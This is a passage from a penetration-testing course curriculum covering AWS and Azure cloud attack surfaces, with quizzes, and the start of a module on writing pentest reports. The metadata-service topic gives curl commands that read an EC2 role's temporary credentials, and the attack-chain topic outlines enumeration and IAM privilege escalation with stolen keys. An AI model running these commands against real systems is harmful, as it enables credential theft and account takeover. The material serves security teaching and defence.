   - Renaming buckets to be harder to guess
   - Disabling S3 entirely
   > Block Public Access is the blunt, effective override recommended instead of relying on getting every individual bucket policy right.

#### 179. Cloud Metadata Service SSRF (EC2 IMDS) `[theory]` — Week 16

Every EC2 instance can reach a special, non-routable address — 169.254.169.254 — from inside itself, with no authentication, to ask the Instance Metadata Service (IMDS) questions about its own configuration: instance ID, network details, user-data scripts, and, critically, the temporary access key/secret key/session token for whatever IAM role is attached to that instance. That last part is what makes IMDS a favorite target: if a web application running on that EC2 instance has a server-side request forgery (SSRF) vulnerability — anywhere the app fetches a URL supplied or influenced by the user, such as a webhook URL, an image-import feature, or a PDF renderer that follows redirects — an attacker can point that fetch at http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> instead of a URL they control, and the response comes straight back through the vulnerable app, handing over live credentials for the instance's IAM role. From there, the attacker uses those stolen credentials directly against the AWS API with whatever permissions that role carries — an SSRF that looked like a low-severity information leak becomes a full cloud-account compromise the moment it reaches IMDS. AWS's real fix is IMDSv2, which requires a session token obtained via an explicit PUT request before any metadata GET is honored — an SSRF vulnerability that can only make simple GET requests (most SSRF, especially via redirects or server-side fetches) can no longer complete the PUT-then-GET flow needed for IMDSv2, which is why enforcing IMDSv2 (and refusing IMDSv1 entirely) at the instance level is the standard mitigation recommended today. You finish able to explain the IMDS SSRF chain end to end and identify whether an instance still allows the vulnerable IMDSv1 path.

**Key Points:**

- IMDS lives at the link-local address 169.254.169.254, reachable only from inside the instance itself, with no authentication required on IMDSv1
- IMDS exposes instance metadata including, for an instance with an attached IAM role, that role's temporary access key/secret key/session token at /latest/meta-data/iam/security-credentials/<role-name>
- SSRF chain: an app with an SSRF flaw (webhook URLs, image/URL importers, PDF renderers that follow redirects) is pointed at the metadata endpoint instead of an external URL, and the stolen role credentials return through the vulnerable response
- Stolen IMDS credentials are used directly against the AWS API, carrying whatever permissions the instance's IAM role has — turning an SSRF into a cloud-account compromise
- IMDSv2 mitigation: requires an explicit PUT request to /latest/api/token to obtain a short-lived session token before any GET against metadata is honored — a simple GET-only SSRF can't complete that PUT step
- Enforcing IMDSv2-only (disabling IMDSv1 entirely) at the instance/launch-template level is the standard, real mitigation

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Quick Quiz:**

1. What address does the EC2 Instance Metadata Service listen on?
   - 10.0.0.1
   - **169.254.169.254, a link-local address reachable only from inside the instance** ✓
   - 8.8.8.8
   - The instance's public IP address
   > IMDS lives at the link-local address 169.254.169.254, reachable only from inside the instance itself.
2. Why does an SSRF vulnerability become a full cloud-account compromise when it reaches IMDS?
   - IMDS deletes the vulnerable application automatically
   - **The metadata response includes the attached IAM role's temporary access key/secret key/session token, usable directly against the AWS API** ✓
   - IMDS grants root shell access to the instance
   - IMDS always contains database passwords
   > IMDS exposes the instance's IAM role credentials, which the attacker can use directly against the AWS API with that role's permissions.
3. Why can't a simple GET-only SSRF vulnerability complete the IMDSv2 attack flow?
   - **IMDSv2 requires an explicit PUT request to /latest/api/token to obtain a session token before any metadata GET is honored** ✓
   - IMDSv2 blocks all traffic from EC2 instances
   - IMDSv2 requires a hardware security key
   - IMDSv2 only responds to HTTPS, and SSRF can only use HTTP
   > IMDSv2 requires a PUT to obtain a token before any GET is honored, which a simple GET-only SSRF (e.g. via redirects) can't complete.

#### 180. Azure AD / Entra ID Basics `[theory]` — Week 16

Azure Active Directory — renamed Microsoft Entra ID — shares a name with on-premises Active Directory but is a fundamentally different system underneath: it's a cloud-native identity provider built around HTTPS-based protocols like OAuth 2.0, OpenID Connect, and SAML, not the Kerberos/NTLM and LDAP protocols that on-prem AD domain controllers speak, and it has no concept of Organizational Units, Group Policy Objects, or Kerberos tickets in the way on-prem AD does. Everything in Entra ID lives inside a tenant — a dedicated, isolated instance of the directory tied to one organization — containing users and groups much like on-prem AD, but access decisions are driven by Conditional Access policies instead of GPOs: a Conditional Access policy is an if-this-then-that rule evaluated at sign-in time (e.g. 'if a user in the Finance group signs in from outside the corporate network, require MFA' or 'block sign-in entirely from specific countries'), giving fine-grained, risk-aware control that static GPOs never could. Many organizations run hybrid identity, where an on-prem AD domain still exists and syncs its users into Entra ID via Azure AD Connect, so the same person authenticates against a cloud-native identity system for cloud/SaaS apps while their on-prem AD account still governs domain-joined machines — a setup that itself introduces its own well-documented attack surface where compromising the sync path or an on-prem account can be leveraged against the cloud tenant. You finish able to explain what a tenant, a Conditional Access policy, and hybrid identity are, and why 'it's just AD in the cloud' undersells how differently Entra ID actually works.

**Key Points:**

- Microsoft rebranded Azure Active Directory to Microsoft Entra ID; still commonly called "Azure AD" in practice and documentation
- Entra ID is a cloud-native identity provider using OAuth 2.0, OpenID Connect, and SAML — not the Kerberos/NTLM/LDAP protocols on-prem AD domain controllers use
- No Organizational Units, no Group Policy Objects, no Kerberos tickets in Entra ID — the on-prem AD mental model doesn't transfer directly
- A tenant is a dedicated, isolated directory instance belonging to one organization, containing that organization's users, groups, and registered applications
- Conditional Access policies are if-this-then-that rules evaluated at sign-in (e.g. require MFA for sign-ins outside the corporate network, or block sign-in from specific countries) — the fine-grained, risk-aware equivalent of a GPO
- Hybrid identity: on-prem AD Domain Services syncs users into Entra ID via Azure AD Connect, so the same identity authenticates against both systems for different resources
- Hybrid sync paths are themselves a documented attack surface — compromising the sync mechanism or an on-prem account can be leveraged against the cloud tenant

**Quick Quiz:**

1. Which protocols does Entra ID use for identity, in contrast to on-prem Active Directory's Kerberos/NTLM/LDAP?
   - FTP and Telnet
   - IPsec and SNMP
   - **OAuth 2.0, OpenID Connect, and SAML** ✓
   - RDP and SMB
   > Entra ID is a cloud-native identity provider built around HTTPS-based OAuth 2.0, OpenID Connect, and SAML, not the Kerberos/NTLM/LDAP on-prem AD uses.
2. What is a Conditional Access policy?
   - A static Group Policy Object applied at logon
   - A Kerberos ticket-granting mechanism
   - A firewall rule for on-prem domain controllers
   - **An if-this-then-that rule evaluated at sign-in time, such as requiring MFA for sign-ins outside the corporate network** ✓
   > Conditional Access policies are if-this-then-that rules evaluated at sign-in, giving fine-grained, risk-aware access control.
3. In hybrid identity, what does Azure AD Connect do?
   - Encrypts all on-prem traffic
   - **Syncs on-prem AD users into Entra ID, so the same identity authenticates against both systems for different resources** ✓
   - Replaces on-prem AD entirely
   - Blocks cloud sign-ins from synced accounts
   > Azure AD Connect syncs on-prem AD users into Entra ID, enabling hybrid identity across both systems.

#### 181. Cloud Logging & Monitoring - CloudTrail & GuardDuty `[theory]` — Week 16

AWS CloudTrail records every API call made against an AWS account — who made it, from what IP, using what credentials, against which resource, and whether it succeeded — turning the account's entire control-plane history into a searchable log. GuardDuty sits on top of that (plus VPC flow logs and DNS logs) as a managed threat-detection service, using threat intelligence and anomaly detection to flag things like an API call from a Tor exit node, credential use from two geographically impossible locations in a short window, or an EC2 instance suddenly querying known cryptomining domains. The reason this module treats logging itself as a security control, not just an operational nicety, is that CloudTrail being disabled, scoped down, or writing to a bucket the attacker can also delete is itself one of the very first things a sophisticated intruder does after gaining a privileged foothold — because a cloud incident response team with no CloudTrail history has no way to answer what happened, when, or how far it spread. An IAM policy that includes actions like cloudtrail:StopLogging or cloudtrail:DeleteTrail granted to more identities than strictly necessary is therefore a real finding on its own, independent of whether logging is currently on, precisely because it's a pre-positioned way to blind incident response the moment it's needed. You finish able to explain what CloudTrail and GuardDuty each cover, and why a disabled or deletable audit trail is treated as a security incident in its own right rather than a mere gap in visibility.

**Key Points:**

- CloudTrail logs every AWS API call: caller identity, source IP, requested action, target resource, and success/failure — the account's control-plane audit trail
- GuardDuty is a managed threat-detection service layered on CloudTrail, VPC Flow Logs, and DNS logs, using threat intelligence and anomaly detection (e.g. API calls from Tor exit nodes, impossible-travel credential use, cryptomining-domain queries from an instance)
- Disabling, scoping down, or redirecting CloudTrail to a deletable/attacker-controlled bucket is one of the first moves a sophisticated intruder makes after gaining a privileged foothold
- No CloudTrail history means incident response cannot reconstruct what happened, when, or how far an intrusion spread — logging gaps directly limit response capability
- IAM permissions like cloudtrail:StopLogging or cloudtrail:DeleteTrail being available to more identities than necessary is a legitimate finding on its own, independent of whether logging is currently active
- CloudTrail logs should themselves be protected: writing to a separate, restricted-access S3 bucket (ideally in a different account) with MFA delete limits an attacker's ability to tamper with the audit trail

```bash
aws cloudtrail describe-trails
aws cloudtrail get-trail-status --name <trail-name>
aws cloudtrail lookup-events --max-results 10
aws guardduty list-detectors
```

**Quick Quiz:**

1. What does AWS CloudTrail record?
   - Only failed login attempts
   - Network packet contents
   - **Every API call against the account -- caller identity, source IP, action, resource, and success/failure** ✓
   - Only console (UI) logins, not the API
   > CloudTrail logs every API call: who made it, from what IP, what action, against what resource, and whether it succeeded.
2. What does GuardDuty add on top of CloudTrail, VPC flow logs, and DNS logs?
   - Automatic firewall rule creation
   - **Managed threat detection using threat intelligence and anomaly detection, e.g. flagging API calls from Tor exit nodes** ✓
   - Encryption of all account data
   - Automatic deletion of compromised resources
   > GuardDuty is a managed threat-detection service layered on those logs, using threat intel and anomaly detection to flag things like Tor exit node activity.
3. Why is an IAM policy granting cloudtrail:StopLogging or cloudtrail:DeleteTrail to too many identities considered a finding on its own?
   - Because it slows down API calls
   - Because it costs extra money to keep the permission enabled
   - Because it violates a naming convention
   - **Because it's a pre-positioned way to blind incident response the moment an attacker needs it, independent of whether logging is currently active** ✓
   > This permission is a legitimate finding regardless of current logging status because it's a pre-positioned way to blind IR after a foothold is gained.

#### 182. Common Cloud Secrets-Exposure Vectors `[theory]` — Week 16

An AWS access key is a plain string — it starts with AKIA (or ASIA for temporary credentials) followed by a secret key — and once it exists in plain text anywhere outside AWS's own systems, it's a liability with no built-in expiry unless someone deliberately rotates or revokes it. The single most common way these leak is developers committing them directly into source code: a hardcoded key in a config file, a `.env` file accidentally not excluded by `.gitignore`, or a debug print statement left in — pushed to a public GitHub repository where it's now indexed and scrapeable by anyone, including automated bots that specifically watch GitHub's public commit stream for exactly this pattern and can begin abusing a leaked key within minutes of the push. Docker images are the second major vector: a secret set via a RUN or ENV instruction persists inside that layer's filesystem diff even if a later layer deletes the file — because each image layer is an immutable diff, and anyone who pulls the image can extract every layer's full filesystem history and find it, regardless of what the final running container looks like. Both vectors share the same underlying lesson: secrets belong in a dedicated secrets manager (AWS Secrets Manager, Azure Key Vault) or injected at runtime via environment variables from the orchestration layer, never written into source code, config files that get committed, or Docker layers — and any credential that has ever touched a public repo or public image, however briefly, has to be treated as fully compromised and rotated, not just removed from the latest commit. You finish able to explain why deleting a leaked key from the latest commit doesn't fix the exposure, and why Docker layer caching makes 'I removed it in a later step' a false sense of security.

**Key Points:**

- AWS access keys are plain strings (AKIA... for long-term, ASIA... for temporary/session credentials) with no built-in expiry unless explicitly rotated or revoked
- Most common leak vector: hardcoded keys or committed .env files pushed to a public GitHub repository — automated scanners actively watch GitHub's public commit stream for this exact pattern
- A leaked key can be found and abused within minutes of a public push, not just theoretically at some later point
- Docker images are the second major vector: a secret set in an early build layer (via RUN or ENV) persists in that layer's filesystem diff even if a later layer deletes it, since image layers are immutable and independently extractable
- "Deleted in a later Dockerfile step" does not remove a secret from the image — anyone who pulls the image can extract every layer and recover it
- Fix for both vectors: secrets belong in a dedicated secrets manager (AWS Secrets Manager, Azure Key Vault) or injected at runtime by the orchestration layer, never committed to source or baked into image layers
- Remediation for an exposed key is rotation/revocation, not just removal from the latest commit — history (git history, old image layers) still contains it

**Quick Quiz:**

1. What AWS access key prefix indicates a temporary/session credential rather than a long-term one?
   - AKIA
   - IAM-
   - TEMP-
   - **ASIA** ✓
   > AKIA prefixes long-term access keys while ASIA prefixes temporary/session credentials.
2. Why does deleting a secret in a later Dockerfile step (RUN rm ...) fail to remove it from the image?
   - Docker automatically re-adds deleted files
   - **Each image layer is an immutable diff, so the secret still exists in the earlier layer's filesystem diff and can be extracted from that layer** ✓
   - Docker images cannot contain secrets at all
   - The secret gets encrypted automatically
   > Image layers are immutable and independently extractable, so a secret set in an earlier layer persists even if a later layer deletes the file.
3. What is the correct remediation once an AWS key has been exposed in a public GitHub repo, even briefly?
   - Simply delete it from the latest commit
   - Rename the repository
   - **Rotate/revoke the key, since git history still contains it and it must be treated as fully compromised** ✓
   - Wait to see if it gets abused before acting
   > Any credential that touched a public repo must be rotated/revoked, not just removed from the latest commit, since history retains it.

#### 183. Synthesis: A Realistic Cloud Attack Chain `[exercise]` — Week 16

Real cloud compromises rarely come from a single dramatic exploit — they're a short chain of individually minor findings, each one setting up the next. A realistic chain starts wherever an attacker gets an initial credential or foothold at all: a public S3 bucket that turns out to contain a config file with an embedded access key, or a key leaked in a public GitHub repo, or an SSRF against an app running on EC2 that reaches the instance metadata service and returns the attached IAM role's temporary credentials. Whichever door opens first, the next step is always the same: run `aws sts get-caller-identity` to confirm exactly which identity was just obtained, then enumerate what that identity is actually allowed to do with commands like `aws iam list-attached-user-policies` and `aws iam list-user-policies` — because a low-privilege-looking credential is often attached to a policy nobody audited, one that includes a wildcard `iam:PassRole` or `iam:CreatePolicyVersion` permission that lets the attacker attach a fully permissive policy to themselves or to a role they can then assume. That's the privilege-escalation step: turning a narrow, seemingly-safe credential into administrator-equivalent access purely by abusing an over-broad IAM policy someone else configured, not by exploiting any new vulnerability. From there, lateral movement is just using the now-elevated credentials against whatever other services exist in the account — reading every other S3 bucket, spinning up EC2 instances, pulling secrets out of Secrets Manager, or pivoting into a connected Azure/on-prem environment via a federated identity. Every step in this chain individually looks survivable in isolation (a public bucket with no secrets, a role with one broad permission, logging that's merely incomplete rather than absent) — the chain is what turns three findings, each individually rated low-to-medium, into a full account takeover, which is exactly why findings from this module shouldn't be triaged one at a time without asking what they connect to. You finish able to walk a realistic AWS attack chain end to end — initial access, identity enumeration, privilege escalation via an over-permissive policy, and lateral movement — and explain why chained low-severity findings deserve a combined severity rating.

**Key Points:**

- Real cloud compromises are usually chains of individually-minor findings, not one dramatic exploit
- Initial access commonly comes from one of: a public S3 bucket containing a stray credential, a leaked key in a public GitHub repo or Docker image, or SSRF reaching the EC2 metadata service
- First move with any new credential: aws sts get-caller-identity to confirm exactly which identity/role was obtained
- Second move: enumerate that identity's actual permissions (aws iam list-attached-user-policies, aws iam list-user-policies) rather than assuming a credential is low-value because it looked minor
- Privilege escalation frequently comes from an over-broad policy already attached by someone else — e.g. a wildcard iam:PassRole or iam:CreatePolicyVersion permission lets the attacker grant themselves broader access without exploiting any new vulnerability
- Lateral movement: using elevated credentials against every other service in the account — other S3 buckets, EC2, Secrets Manager, or a federated connection into Azure/on-prem
- Each individual step in the chain often looks low-to-medium severity on its own; the combined chain is what produces full account takeover — a reason to triage related findings together rather than in isolation

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws s3 ls s3://bucket-name --no-sign-request
```

**Quick Quiz:**

1. After obtaining a new AWS credential through any initial-access vector, what is the very first command run?
   - aws s3 ls to look for buckets
   - aws iam create-user to make a backup account
   - **aws sts get-caller-identity, to confirm exactly which identity/role was obtained** ✓
   - aws ec2 describe-instances
   > The first move with any new credential is aws sts get-caller-identity to confirm exactly which identity/role was obtained.
2. How can a wildcard iam:PassRole or iam:CreatePolicyVersion permission lead to privilege escalation?
   - It requires exploiting a new zero-day vulnerability
   - **It lets the attacker grant themselves broader access purely by abusing an over-broad policy someone else already configured, without exploiting anything new** ✓
   - It only affects read-only S3 access
   - It automatically notifies AWS support
   > This is privilege escalation via an over-broad existing policy, not a new vulnerability -- the attacker attaches a fully permissive policy to themselves or an assumable role.
3. Why does the module argue that chained low-severity cloud findings deserve a combined severity rating?
   - Because low-severity findings are never real risks on their own
   - Because AWS requires combined ratings for compliance
   - Because individual findings can't be reproduced
   - **Because each step (a bucket with no secrets, one broad permission, incomplete logging) can look survivable in isolation, but together the chain produces full account takeover** ✓
   > Each step often looks low-to-medium severity alone, but the chain together is what turns three findings into a full account takeover.


---

## M21: Professional Reporting

**Month 4** · Week 16 · 7 topics

The programme's final module — turning a completed engagement into the one artifact a client actually judges it by: the report. Covers CVSS v3.1 scoring, writing for a non-technical executive audience, structuring a technical finding with real evidence and actionable remediation, and the common mistakes that quietly wreck an otherwise strong assessment. The module closes by applying all of it to your own Week 12 capstone findings, producing the exact deliverable a paying client receives at the end of a real engagement.

**Learning Outcomes:**

- Explain why the report is the actual client deliverable, not the exploit that produced it
- Score any finding using CVSS v3.1 base metrics and correctly place it in the None/Low/Medium/High/Critical severity bands
- Write an executive summary a CISO or non-technical sponsor could forward without translation
- Structure a complete technical finding — title, CVSS score, affected asset, evidence, reproduction steps, and specific remediation
- Recognise the reporting mistakes (over-technical language, missing repro steps, inflated severity, unflagged false positives) that erode a report's credibility

**Module Resources:**

- [FIRST.org CVSS v3.1 Specification Document](https://www.first.org/cvss/v3-1/specification-document) _(link)_
- [PTES Technical Guidelines (maintained mirror; pentest-standard.org is currently unreachable)](https://pentest-standard.readthedocs.io/en/latest/) _(link)_
- [SANS Reading Room (Cybersecurity Whitepapers)](https://www.sans.org/white-papers/) _(link)_
- [TCM Security: sample pentest report](https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report) _(link)_

**Module Quiz (9 questions):**

1. Per this module, what is the actual deliverable a client receives at the end of a penetration test?
   - The exploit code
   - The compromised shell
   - The raw evidence folder
   - **The report** ✓
   > The module frames the report itself as the product of a penetration test, not the exploit, shell, or evidence folder.
2. A finding receives a CVSS v3.1 Base score of 5.5. Which severity band does it fall into?
   - Low (0.1-3.9)
   - **Medium (4.0-6.9)** ✓
   - High (7.0-8.9)
   - Critical (9.0-10.0)
   > The module's severity bands place 4.0-6.9 in Medium, and 5.5 falls within that range.
3. Why does an executive summary say 'an attacker could read every customer's payment data' instead of 'SQL injection in the /api/orders endpoint'?
   - Because SQL injection is not a real vulnerability class
   - Because CVSS forbids naming the endpoint
   - **Because the summary is aimed at a non-technical reader and must translate technique into business impact** ✓
   - Because endpoints are always redacted for legal reasons
   > The module states executive summaries frame findings by business impact rather than technical jargon so a non-technical reader understands them.
4. Which of these is required in the standard anatomy of a technical finding, per this module?
   - **Exact reproduction steps, numbered and complete enough for someone not in the room to trigger the same result** ✓
   - A narrative paraphrase of what was seen, without evidence
   - A generic remediation like 'improve security'
   - An estimate of how long the finding took to discover
   > The module states reproduction steps must be exact and complete enough that someone who wasn't in the room can trigger the same result.
5. What remediation timeframe does this module recommend for a Critical-severity finding?
   - The next scheduled release cycle
   - No deadline is necessary since severity alone conveys urgency
   - A multi-month window
   - **An immediate or days-scale fix window** ✓
   > The module ties Critical findings to an immediate or days-scale fix window, with lower severities getting longer windows.
6. Why does inflating severity ratings (labeling everything Critical or High) backfire, per this module?
   - It has no real downside as long as the client pays
   - **The first time a client successfully disputes a score, every other score in the report becomes suspect** ✓
   - CVSS automatically corrects inflated scores
   - It only affects the executive summary, not the technical findings
   > The module states inflated severity erodes trust fast, since the first successful dispute makes every other score suspect.
7. In the capstone synthesis exercise, how many of your own findings must receive a full CVSS v3.1 base score walkthrough?
   - Exactly one
   - Zero — scoring is optional for the capstone
   - **At least three** ✓
   - All findings from every module
   > The capstone exercise requires a full CVSS v3.1 base score walkthrough for at least three of your own capstone findings.
8. What does the CVSS Scope metric measure?
   - **Whether a successful exploit can affect resources beyond the vulnerable component's own security authority, such as escaping a sandbox** ✓
   - How many servers are in the client's environment
   - Whether the finding was discovered via active or passive recon
   - The number of remediation options available
   > The module defines Scope as capturing whether an exploit affects resources beyond the vulnerable component's own security authority.
9. Why is a finding with missing or vague reproduction steps a serious reporting mistake?
   - Because it automatically raises the CVSS score
   - Because it violates the FIRST.org specification
   - Because it requires the executive summary to be rewritten
   - **Because it makes the finding unverifiable — indistinguishable to a skeptical reader from one that was never real** ✓
   > The module states missing or vague reproduction steps make a finding unverifiable, indistinguishable from an incorrect one.

### Topics

#### 300. Why Reporting Is the Actual Deliverable `[theory]` — Week 16

Client engagements are judged by one artifact: the report — not the exploit, not the shell, not the evidence folder sitting on your laptop. A finding that never makes it into a clear, actionable write-up delivers zero value to the client, no matter how difficult it was to find or how cleanly it was exploited; from the client's side, an unreported vulnerability and one that was never discovered look identical. This topic reframes the report itself as the product of a penetration test — the exploit is the research that produces the product, not the product itself — and sets up why every topic that follows (CVSS scoring, executive framing, finding structure, remediation guidance) exists purely in service of making that product usable by the people who have to act on it. You finish able to explain, in one sentence, why a pentester who can't write is a pentester who can't get paid twice.

**Key Points:**

- A vulnerability the client can't understand, verify, or prioritise is functionally the same as a vulnerability never found — value is realised only through the report
- The exploit, the shell, the loot are research artifacts; the report is the deliverable the client actually purchased and will act on
- Clients, auditors, and insurers judge an engagement's quality by report clarity and completeness, not by how technically impressive the attack chain was
- Every downstream skill in this module — CVSS scoring, executive framing, finding anatomy, remediation guidance — exists to make the report the thing that gets fixes shipped
- A weak report can waste a strong technical engagement; a strong report can make even a modest set of findings feel worth the client's spend

**Quick Quiz:**

1. What happens to the value of a vulnerability that a client cannot understand, verify, or prioritise, according to this topic?
   - It is automatically classified as a false positive
   - **It is functionally the same as a vulnerability that was never found — value is only realised through the report** ✓
   - It still counts as full value because it was technically discovered
   - It gets escalated automatically to Critical severity
   > The topic states an unreported or unusable vulnerability is functionally identical to one never found, since value is only realised through the report.
2. This topic reframes the exploit, the shell, and the loot from an engagement as:
   - The actual deliverable the client purchased
   - Irrelevant details that shouldn't be mentioned in the report
   - **Research artifacts, with the report being the actual product** ✓
   - The primary basis for CVSS scoring
   > The exploit, shell, and loot are described as research artifacts; the report is the deliverable the client actually purchased and acts on.
3. Per this topic, what determines whether a strong technical engagement is perceived as worthwhile by the client?
   - The number of exploits chained together
   - **The report — a weak report can waste a strong engagement, while a strong report can make even modest findings feel worth the spend** ✓
   - How advanced the tools used were
   - How quickly access was obtained
   > The topic states a weak report can waste a strong engagement, and a strong report can make modest findings feel worth the client's spend.

#### 301. CVSS v3.1 Scoring Methodology `[theory]` — Week 16

CVSS v3.1 (Common Vulnerability Scoring System, maintained by FIRST.org) is the industry-standard way to turn 'this is bad' into a defensible, comparable number every stakeholder — engineer, CISO, auditor — reads the same way. The Base score is built from two metric groups: Exploitability metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction, and Scope) describing how hard the vulnerability is to reach and trigger, and Impact metrics (the Confidentiality, Integrity, and Availability triad) describing what happens once it's exploited. Those metrics combine through FIRST's published formula into a single 0.0-10.0 Base score, which then maps onto severity bands: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), and Critical (9.0-10.0). You finish able to walk a finding through each metric group by hand, land on a defensible score using the official CVSS calculator, and explain to a skeptical stakeholder why a finding landed in one severity band and not the one they expected.

**Key Points:**

- Base score combines Exploitability metrics (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope) with Impact metrics (Confidentiality, Integrity, Availability)
- Attack Vector ranges from Network (remotely exploitable) down to Physical (requires touching the device) — generally, the further away an attacker can be, the higher that metric's contribution to the score
- Scope captures whether a successful exploit can affect resources beyond the vulnerable component's own security authority (e.g. breaking out of a sandbox) — a Scope Changed finding scores meaningfully higher than the same bug with Scope Unchanged
- Confidentiality, Integrity, and Availability are each rated by degree of impact (e.g. None/Low/High), not simply presence or absence
- Base score maps to severity bands: None (0.0), Low (0.1-3.9), Medium (4.0-6.9), High (7.0-8.9), Critical (9.0-10.0)
- Score with FIRST's official calculator rather than eyeballing a number — reproducibility of the score matters as much as the score itself when a client challenges it

**Quick Quiz:**

1. A finding is scored with a Base score of 8.2. Which severity band does it fall into per CVSS v3.1?
   - Medium (4.0-6.9)
   - Low (0.1-3.9)
   - Critical (9.0-10.0)
   - **High (7.0-8.9)** ✓
   > The stated severity bands place 7.0-8.9 in High, and 8.2 falls in that range.
2. What does the CVSS Scope metric capture?
   - **Whether a successful exploit can affect resources beyond the vulnerable component's own security authority, e.g. a sandbox escape** ✓
   - How many customers are affected by the vulnerability
   - Whether the vulnerability was found via passive or active recon
   - The number of CVEs related to the finding
   > Scope captures whether an exploit can affect resources beyond the vulnerable component's own security authority, such as a sandbox escape.
3. Why does this topic recommend scoring with FIRST's official CVSS calculator instead of eyeballing a number?
   - Because eyeballing always produces a higher score
   - Because the calculator is required by law
   - **Because reproducibility of the score matters as much as the score itself when a client challenges it** ✓
   - Because manual scoring is impossible without internet access
   > The topic states reproducibility of the score matters as much as the score itself when a client challenges it.

#### 302. Structuring the Executive Summary `[theory]` — Week 16

The executive summary is the only page of the report a CISO, a board member, or a non-technical executive sponsor may ever actually read in full — everything after it is reference material for the engineers who implement fixes. That means it has to answer three questions in plain business language before anything else: what did you test, how much risk does the organisation actually carry right now, and what does leadership need to decide or fund next. Framing findings by business impact — 'an attacker could read every customer's payment data' rather than 'SQL injection in the /api/orders endpoint' — is what makes the summary land with a reader who has never heard of a parameter or a payload. You finish able to write an executive summary that a CISO could forward to their own board without translation.

**Key Points:**

- Written for a reader who will never open the technical findings section — assume zero familiarity with attack techniques or tooling
- Lead with overall risk posture and the highest-severity findings' business consequences, not a chronological account of the engagement
- Translate technique into impact: not 'authentication bypass via JWT algorithm confusion' but 'an external attacker can log in as any customer, including administrators'
- State scope and objectives briefly so the reader knows what was and wasn't tested — an executive summary that overstates coverage erodes trust the moment someone checks
- Close with what leadership needs to do next — fund remediation, accept residual risk, or escalate — not just a list of numbers

**Quick Quiz:**

1. Why does the executive summary translate 'authentication bypass via JWT algorithm confusion' into 'an external attacker can log in as any customer, including administrators'?
   - Because JWT bugs are always low severity
   - **Because the summary is written for a non-technical reader who needs impact framed in plain business language, not technique** ✓
   - Because CVSS scoring requires plain language
   - Because technical terms are banned from the entire report
   > The executive summary is written for a reader with zero familiarity with attack techniques, so it translates technique into business impact.
2. What should the executive summary lead with?
   - A full chronological account of every step of the engagement
   - Every CVE identifier discovered, in numerical order
   - Terminal commands used during testing
   - **Overall risk posture and the highest-severity findings' business consequences** ✓
   > The topic states the summary should lead with overall risk posture and the highest-severity findings' business consequences, not a chronological account.
3. Why does overstating scope or coverage in the executive summary damage the report?
   - **It erodes trust the moment someone checks what was actually tested** ✓
   - It automatically lowers all CVSS scores
   - It is illegal under CVSS v3.1
   - It has no real consequence since the summary isn't read
   > The topic warns that an executive summary overstating coverage erodes trust the moment someone checks.

#### 303. Structuring a Technical Finding `[theory]` — Week 16

Detailed findings are where the report earns its technical credibility, and every mature reporting standard converges on nearly the same anatomy because each piece answers a question a reader will actually ask. Title and severity/CVSS score let someone triaging thirty findings sort by what matters first; affected asset pins the finding to a specific host, endpoint, or component so a developer isn't hunting for what to fix; the description explains the vulnerability in enough technical depth for an engineer to understand the mechanism; evidence — a screenshot, a full request/response pair, a terminal capture — proves the finding is real rather than a scanner's guess; exact reproduction steps let the client's own team verify the bug without your help; and remediation guidance specific enough to act on (not 'improve input validation' but the specific parameter, the specific fix pattern, and the specific place it belongs) is what actually gets the fix shipped. You finish able to take a raw exploitation note and turn it into a finding write-up a developer could hand straight to a ticket without a single follow-up question.

**Key Points:**

- Standard anatomy: title, severity/CVSS score, affected asset, description, evidence, reproduction steps, remediation
- Evidence means proof, not narration — a real screenshot or a full HTTP request/response pair, not a paraphrase of what you saw
- Reproduction steps must be exact and complete enough that someone who wasn't in the room can trigger the same result — numbered steps, not a summary
- Remediation guidance has to be specific to the finding: name the parameter, header, configuration flag, or code pattern — generic advice ('sanitize input', 'use HTTPS') gets ignored because it gives the developer nothing to act on
- Affected asset should be precise (hostname, IP, endpoint, parameter) so a large finding list can be triaged by system owner without re-reading every description

**Quick Quiz:**

1. Why does the standard finding anatomy include 'evidence' as a distinct component from the description?
   - Evidence is optional and rarely included
   - Evidence replaces the need for reproduction steps
   - **Evidence must be proof — a real screenshot or full request/response pair — not a paraphrase of what was seen** ✓
   - Evidence is only required for Critical findings
   > The topic states evidence means proof, not narration — a real screenshot or full HTTP request/response pair.
2. Why does generic remediation advice like 'sanitize input' get ignored by developers, per this topic?
   - Because developers don't read remediation sections
   - **Because it gives the developer nothing specific to act on — no named parameter, header, config, or code pattern** ✓
   - Because it contradicts the CVSS score
   - Because sanitizing input is never the correct fix
   > The topic states generic advice gets ignored because it gives the developer nothing to act on, unlike naming the specific parameter or fix pattern.
3. Why should the affected asset be listed precisely (hostname, IP, endpoint, parameter)?
   - So the executive summary can be skipped entirely
   - So the CVSS score can be calculated automatically
   - Because vague assets are considered false positives
   - **So a large finding list can be triaged by system owner without re-reading every description** ✓
   > The topic states a precise affected asset lets a large finding list be triaged by system owner without re-reading every description.

#### 304. Remediation Prioritisation and Timelines `[theory]` — Week 16

A report that lists ten findings with no sense of what to fix first is asking a client to make a risk decision you're better positioned to make for them. Remediation guidance needs a realistic timeframe tied to severity — Critical findings paired with an immediate or days-scale fix window, High findings with weeks, Medium and Low with the next scheduled release or patch cycle — because a client's engineering team is triaging this report against every other piece of work already on their plate, and a finding with no deadline attached quietly loses that competition. Specificity matters as much as urgency: 'fix input validation' tells a developer nothing they can put in a pull request, while naming the exact query, endpoint, or parameter and the specific fix pattern tells them exactly what to change. You finish able to turn a severity score into a remediation timeline a project manager could put directly into a sprint plan.

**Key Points:**

- Tie remediation timeframes to severity bands, not to how interesting the finding was to find — Critical gets the shortest window, Low the longest
- A timeline with no deadline is a suggestion, not a requirement — clients deprioritise undated findings against dated work
- Vague remediation advice ('fix input validation', 'improve authentication') is functionally unactionable — name the exact parameter, endpoint, config setting, or code location and the specific fix pattern
